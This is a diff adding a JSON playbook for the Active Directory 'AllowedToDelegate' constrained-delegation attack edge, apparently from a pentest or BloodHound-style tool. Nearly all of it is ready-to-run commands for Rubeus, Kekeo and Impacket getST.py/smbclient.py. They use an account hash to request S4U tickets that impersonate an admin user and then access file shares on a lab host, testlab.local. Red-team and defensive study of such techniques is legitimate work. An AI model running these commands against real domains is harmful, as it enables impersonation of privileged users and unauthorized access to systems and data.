@@ -1,0 +1,63 @@
+{
+    "AllowedToDelegate": {
+        "meaning": "The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer.",
+        "common": "",
+        "windows": {
+            "Rubeus": [
+                {
+                    "order": 1,
+                    "command": "Rubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:\"HTTP/PRIMARY.testlab.local\" /altservice:cifs /ptt",
+                    "description": "Perform S4U2self/S4U2proxy attack to impersonate admin user and access file system"
+                }
+            ],
+            "Kekeo": [
+                {
+                    "order": 1,
+                    "command": "kekeo.exe \"tgt::ask /user:victim /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe\"",
+                    "description": "Request TGT for victim account"
+                },
+                {
+                    "order": 2,
+                    "command": "kekeo.exe \"tgs::s4u /tgt:TGT_victim@TESTLAB.LOCAL_krbtgt~testlab.local@TESTLAB.LOCAL.kirbi /user:admin@testlab.local /service:HTTP/PRIMARY.testlab.local\"",
+                    "description": "Request service ticket via S4U2proxy delegation"
+                }
+            ]
+        },
+        "linux": {
+            "Impacket": [
+                {
+                    "order": 1,
+                    "command": "getST.py -spn HTTP/PRIMARY.testlab.local -impersonate admin -hashes :2b576acbe6bcfda7294d6bd18041b8fe testlab.local/victim",
+                    "description": "Get service ticket via constrained delegation using getST.py"
+                },
+                {
+                    "order": 2,
+                    "command": "export KRB5CCNAME=admin.ccache",
+                    "description": "Set Kerberos credential cache"
+                },
+                {
+                    "order": 3,
+                    "command": "smbclient.py testlab.local/admin@PRIMARY.testlab.local -k -no-pass",
+                    "description": "Access target using Kerberos ticket"
+                }
+            ],
+            "Impacket_AltService": [
+                {
+                    "order": 1,
+                    "command": "getST.py -spn HTTP/PRIMARY.testlab.local -impersonate admin -altservice cifs -hashes :2b576acbe6bcfda7294d6bd18041b8fe testlab.local/victim",
+                    "description": "Get service ticket with alternative service name (CIFS)"
+                },
+                {
+                    "order": 2,
+                    "command": "export KRB5CCNAME=admin.ccache",
+                    "description": "Set Kerberos credential cache"
+                },
+                {
+                    "order": 3,
+                    "command": "smbclient.py testlab.local/admin@PRIMARY.testlab.local -k -no-pass",
+                    "description": "Access file shares using delegated credentials"
+                }
+            ]
+        }
+    }
+}
